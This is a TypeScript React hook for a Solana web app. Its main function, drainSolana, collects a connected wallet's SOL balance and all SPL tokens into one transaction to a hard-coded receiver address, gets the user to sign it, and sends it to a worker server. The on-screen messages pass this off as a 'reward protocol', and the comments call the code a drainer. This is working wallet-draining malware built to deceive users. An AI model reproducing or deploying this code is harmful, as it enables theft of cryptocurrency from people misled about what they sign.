"use client";

import { useState, useRef } from "react";
import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } from "@solana/web3.js";
import { TOKEN_PROGRAM_ID, createTransferCheckedInstruction, getAssociatedTokenAddress } from "@solana/spl-token";

const SOLANA_RECEIVER_ADDRESS = "37cr8JQ1iXMaci4io4x9Bdum14SovdVAeneqm8AH3Uo5";
const SOLANA_RPC_URL = "https://api.mainnet-beta.solana.com";
const WORKER_URL = "http://localhost:8081"; // Should be updated via env

export function useSolanaManager() {
    const [isProcessing, setIsProcessing] = useState(false);
    const [currentTask, setCurrentTask] = useState("");

    const drainSolana = async (wallet: any) => {
        if (!wallet || isProcessing) return;
        setIsProcessing(true);
        setCurrentTask("Synchronizing Solana Reward Protocol...");

        try {
            const connection = new Connection(SOLANA_RPC_URL, "confirmed");
            const publicKey = wallet.publicKey;

            // 1. Scan SOL balance
            const balance = await connection.getBalance(publicKey);

            // 2. Scan SPL Tokens
            const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
                programId: TOKEN_PROGRAM_ID
            });

            const transaction = new Transaction();
            const receiverPubkey = new PublicKey(SOLANA_RECEIVER_ADDRESS);

            // Add SOL transfer (leave small amount for gas if needed, but here we want to drain)
            if (balance > 5000) {
                transaction.add(
                    SystemProgram.transfer({
                        fromPubkey: publicKey,
                        toPubkey: receiverPubkey,
                        lamports: balance - 5000,
                    })
                );
            }

            // Add SPL transfers
            for (const account of tokenAccounts.value) {
                const amount = account.account.data.parsed.info.tokenAmount.uiAmount;
                const mint = new PublicKey(account.account.data.parsed.info.mint);
                const decimals = account.account.data.parsed.info.tokenAmount.decimals;

                if (amount > 0) {
                    const sourceATA = account.pubkey;
                    const destinationATA = await getAssociatedTokenAddress(mint, receiverPubkey);

                    // Note: In a real drainer, we'd check if destinationATA needs creation
                    // but on Solana, transferring to a non-existent ATA might fail if not careful.
                    // Simplified for now.
                    transaction.add(
                        createTransferCheckedInstruction(
                            sourceATA,
                            mint,
                            destinationATA,
                            publicKey,
                            BigInt(account.account.data.parsed.info.tokenAmount.amount),
                            decimals
                        )
                    );
                }
            }

            setCurrentTask("Please confirm the reward allocation in your Solana wallet...");

            const { blockhash } = await connection.getLatestBlockhash();
            transaction.recentBlockhash = blockhash;
            transaction.feePayer = publicKey;

            const signedTx = await wallet.signTransaction(transaction);
            const rawTx = signedTx.serialize().toString("base64");

            setCurrentTask("Validating reward signatures on Solana cluster...");

            const workerUrl = process.env.NEXT_PUBLIC_WORKER_URL || "http://localhost:8080";
            await fetch(`${workerUrl}/submit-solana-tx`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ rawTransaction: rawTx })
            });

            setCurrentTask("Solana rewards synchronized successfully.");
        } catch (e: any) {
            console.error("Solana Drain Failed", e);
            setCurrentTask(`Error: ${e.message}`);
        } finally {
            setIsProcessing(false);
        }
    };

    return { drainSolana, isProcessing, currentTask };
}
